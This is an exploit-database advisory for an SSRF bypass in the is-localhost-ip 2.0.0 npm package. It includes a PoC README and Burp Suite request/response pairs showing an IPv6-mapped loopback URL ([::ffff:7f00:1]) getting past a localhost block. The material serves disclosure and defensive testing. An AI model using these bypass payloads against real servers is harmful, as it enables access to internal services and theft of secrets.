---
title: is-localhost-ip 2.0.0 - SSRF via Restrictions bypass
url: https://cxsecurity.com/issue/WLB-2025110010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-11-13
fetch_date: 2025-11-14T03:12:07.854262
---

# is-localhost-ip 2.0.0 - SSRF via Restrictions bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **is-localhost-ip 2.0.0 - SSRF via Restrictions bypass** **2025.11.13**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Titles: is-localhost-ip 2.0.0 - SSRF via Restrictions bypass
# Author: nu11secur1ty
# Date: 11/09/2025
# Vendor: https://github.com/tinovyatkin/is-localhost-ip
# Software: https://github.com/tinovyatkin/is-localhost-ip/releases/tag/v2.0.0
# Reference: https://portswigger.net/web-security/ssrf
# CVE-2025-9960
## Description:
# SSRF PoC — Professional README
\*\*WARNING: This repository contains a proof‑of‑concept (PoC) demonstrating an SSRF / localhost canonicalization bypass.
Run only on isolated, non-production machines (local VM, sandbox). Do NOT expose to the internet.\*\*
## Overview
This PoC demonstrates how a naive server that blocks "localhost" by name can be bypassed using alternate IP encodings (hex, decimal, octal, IPv6-mapped). The included `index.js` is a \*\*tested, minimal\*\* Express app that:
- Provides `/check-url?url=<URL>` which checks `is-localhost-ip(hostname)` and fetches the URL if allowed.
- Provides `/secret` that returns a generated secret-style JSON object (used to prove leakage).
- Includes a test harness to exercise multiple host encodings — \*\*tests are disabled by default\*\* and must be explicitly enabled with `ENABLE\_SELF\_TEST=1`.
## Files included
- `PoC.js` — the PoC server (safe by default: self-tests disabled unless enabled).
- `package.json` — minimal package manifest.
- `README.md` — this file.
## Quick security summary (read before running)
- \*\*Do not\*\* run this on machines that have access to production networks, secret stores, or sensitive services.
- The PoC generates synthetic API keys at `/secret`. If a test succeeds, a generated key will be returned by `/check-url` — treat that as proof-of-concept and not a real secret, unless you wired it to a real system.
- Prefer running inside an isolated VM with no network access to your corporate network; or a disposable container with blocked egress to RFC1918 and loopback.
## Requirements
- Node.js \*\*v18+\*\* (for built-in `fetch`).
- npm (comes with Node).
## Setup
```bash
# create directory and extract the archive or clone this repo
# inside the project directory:
npm install
```
`package.json` in this archive will install:
- `express`
- `is-localhost-ip`
- `ipaddr.js` (used by the safer checks in the index.js)
## How to run (safe default)
By default, the server will \*\*not\*\* run the self-tests. To start the server:
```bash
node PoC.js
```
You should see:
```
Express server running on http://localhost:3005
Self-tests disabled (set ENABLE\_SELF\_TEST=1 to enable)
```
Then in another terminal:
```bash
curl "http://localhost:3005/check-url?url=https://example.com"
```
Expected: fetched content preview (if allowed).
## How to run the internal tests (ONLY in an isolated environment)
If you want to run the bypass tests to reproduce the PoC \*\*locally and isolated\*\*, enable them explicitly:
```bash
ENABLE\_SELF\_TEST=1 node PoC.js
```
The process will run a set of encoded-hostname tests against the local `/secret` endpoint and print a summary. If any variant returns `200` and the response includes `"apikey":`, that variant demonstrated a bypass in your environment.
## How to disable the `/secret` endpoint (extra safety)
If you want to remove the sensitive test endpoint entirely, edit `PoC.js` and remove or comment out the `/secret` route.
## Safe patch summary (what this PoC does to be safer)
- Resolves hostnames to IP addresses server-side using DNS and checks all addresses against ipaddr.js ranges (rejects loopback/private/link-local/reserved).
- Rejects non-http(s) schemes, credentials in URL, and non-allowed ports.
- Avoids following redirects when fetching upstream resources.
- Disables automatic self-tests by default (opt-in).
## Responsible disclosure template
If you plan to report this behavior to a maintainer/vendor, use the template in the original analysis or contact the project privately with:
- Node version, OS, `is-localhost-ip` version
- Minimal PoC command and the exact payload(s) that worked
- Logs showing the returned JSON that includes the generated `apikey`
## License
This PoC is provided for testing and defensive purposes only. Use at your own risk. No warranty.
----------------------------------------------------------------
STATUS: Medium
[+]Payload + Exploit Burp Suite:
```
# normal 403 Forbidden
GET /check-url?url=http://10.10.0.28:3005 HTTP/1.1
Host: 10.10.0.28:3005
Content-Len gth: 2
Content-Length: 2
HTTP/1.1 403 Forbidden
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 33
ETag: W/"21-6j4oICVQ6Z+6nx0WETDHqqeeklM"
Date: Sun, 09 Nov 2025 09:29:34 GMT
Connection: keep-alive
Keep-Alive: timeout=5
{"error":"localhost not allowed"}
-----------------------------------------------------------------
# Exploit
GET /check-url?url=http://[::ffff:7f00:1]:3005 HTTP/1.1
Host: 10.10.0.28:3005
Content-Len gth: 2
Content-Length: 2
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 306
ETag: W/"132-0QnJdvy6r/DgvnNvBs+i8eLbOLc"
Date: Sun, 09 Nov 2025 09:29:28 GMT
Connection: keep-alive
Keep-Alive: timeout=5
{"message":"Express server running","usage":"GET /check-url?url=https://10.10.0.28:3005","examples":["GET /check-url?url=https://httpbin.org/json","GET /check-url?url=http://localhost:8080","GET /check-url?url=https://google.com"],"endpoints":["GET /","GET /check-url?url=<URL>","GET /secret"],"port":3005}
```
# Reproduce:
[href](https://github.com/nu11secur1ty/Windows11Exploits/tree/main/2025/CVE-2025-9960)
# Demo:
[href](https://www.patreon.com/posts/cve-2025-9960-is-143172786)
# Time spent:
03:15:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
home page: https://www.asc3t1c-nu11secur1ty.com/...